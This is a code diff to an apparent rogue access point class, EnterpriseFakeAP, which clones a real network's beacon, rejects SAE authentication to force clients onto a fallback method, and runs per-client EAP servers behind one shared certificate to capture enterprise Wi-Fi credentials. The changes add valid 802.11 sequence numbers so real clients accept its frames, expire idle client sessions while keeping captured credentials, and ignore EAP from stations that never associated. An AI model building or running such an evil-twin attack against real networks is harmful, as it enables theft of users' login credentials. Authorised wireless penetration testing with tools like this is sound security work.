@@ -27,6 +27,9 @@ _BEACON_BODY = 36
 _ELEMID_TIM = 5
 _AUTH_ALG_SAE = 3
 _STATUS_NOT_SUPPORTED_AUTH_ALG = 13
+_SEQ_SPACE = 0x1000                     # 802.11 sequence number is 12 bits
+_SESSION_TTL_S = 60.0                   # forget a client's EAP state after this idle span
+_REAP_PERIOD_S = 30.0
 
 
 @dataclass
@@ -61,12 +64,15 @@ class EnterpriseFakeAP:
         self.stats = EnterpriseStats()
         self._context = server_context(cert_path)              # one cert, shared by every client
         self._servers: Dict[str, EapServer] = {}
+        self._last_seen: Dict[str, float] = {}                 # client MAC -> monotonic timestamp
         self._recorded: set[tuple[str, str]] = set()
         self._credentialed: set[str] = set()                   # clients whose credential we already have
         self._probe_resp = self._probe_resp_from(twin_beacon)
         self._running = False
         self._fake_mac_armed = False
         self._rx_registered = False
+        self._seq = 0
+        self._last_reap = time.monotonic()
         self._beacon_task: Optional[asyncio.Task] = None
 
     # ----- lifecycle ---------------------------------------------------------
@@ -113,13 +119,27 @@ class EnterpriseFakeAP:
         failing = False
         while self._running:
             try:
-                await self.iface.send_no_wait(self._restamp(self.twin_beacon))
+                await self.iface.send_no_wait(self._with_seq(self._restamp(self.twin_beacon)))
                 failing = False
             except Exception:
                 if not failing:
                     logger.exception("EnterpriseFakeAP beacon send failed; still beaconing")
                 failing = True
+            self._reap_idle_sessions()
             await asyncio.sleep(_BEACON_PERIOD_S)
+
+    def _reap_idle_sessions(self) -> None:
+        """Drop the per-client EAP state (TLS tunnels, buffers) of clients gone idle, so a long run
+        or a spraying station cannot grow the server map without bound. Capture results are kept."""
+        now = time.monotonic()
+        if now - self._last_reap < _REAP_PERIOD_S:
+            return
+        self._last_reap = now
+        stale = [cs for cs, last_seen in self._last_seen.items() if now - last_seen >= _SESSION_TTL_S]
+        for cs in stale:
+            self._last_seen.pop(cs, None)
+            self._servers.pop(cs, None)
+            self._credentialed.discard(cs)
 
     @staticmethod
     def _probe_resp_from(beacon: bytes) -> bytes:
@@ -169,8 +189,12 @@ class EnterpriseFakeAP:
             return
         self._tx(self._restamp(self._probe_resp[:4] + client + self._probe_resp[10:]))
 
+    def _mark_seen(self, client: bytes) -> None:
+        self._last_seen[mac_to_str(client)] = time.monotonic()
+
     def _on_auth(self, raw: bytes, client: bytes) -> None:
         self.stats.auth += 1
+        self._mark_seen(client)
         if int.from_bytes(raw[24:26], "little") == _AUTH_ALG_SAE:
             self._tx(auth_resp(self.bssid, client, algorithm=_AUTH_ALG_SAE,
                                status=_STATUS_NOT_SUPPORTED_AUTH_ALG))
@@ -179,6 +203,7 @@ class EnterpriseFakeAP:
 
     def _on_assoc(self, pkt, client: bytes) -> None:
         self.stats.assoc += 1
+        self._mark_seen(client)
         reassoc = pkt.subtype_id == 0x02
         self._tx(assoc_resp(self.bssid, client, channel=self.channel, reassoc=reassoc,
                             twin_beacon=self.twin_beacon))
@@ -186,6 +211,7 @@ class EnterpriseFakeAP:
 
     def _on_eapol_start(self, client: bytes) -> None:
         self.stats.eapol_starts += 1
+        self._mark_seen(client)
         self._begin_eap(client)
 
     def _new_server(self, cs: str) -> EapServer:
@@ -206,12 +232,16 @@ class EnterpriseFakeAP:
         self._emit(client, self._new_server(mac_to_str(client)).start())
 
     def _on_eap(self, client: bytes, raw: bytes) -> None:
+        cs = mac_to_str(client)
+        if cs not in self._servers and cs not in self._last_seen:
+            return                                             # EAP from a station that never associated
         message = eap_from_frame(raw)
         if message is None:
             return
-        server = self._servers.get(mac_to_str(client))
+        self._mark_seen(client)
+        server = self._servers.get(cs)
         if server is None:
-            server = self._new_server(mac_to_str(client))
+            server = self._new_server(cs)
         try:
             outgoing = server.receive(message)
         except Exception:
@@ -246,4 +276,13 @@ class EnterpriseFakeAP:
 
     async def _send_in_order(self, frames) -> None:
         for frame in frames:
-            await self.iface.send_no_wait(frame)
+            await self.iface.send_no_wait(self._with_seq(frame))
+
+    def _with_seq(self, frame: bytes) -> bytes:
+        """Stamp the next 802.11 sequence number (fragment 0) into the header, so real clients and
+        their duplicate-detection do not drop our frames as repeats of a zero-sequence frame."""
+        if len(frame) < 24:
+            return frame
+        seq_ctrl = struct.pack("<H", self._seq << 4)
+        self._seq = (self._seq + 1) % _SEQ_SPACE
+        return frame[:22] + seq_ctrl + frame[24:]
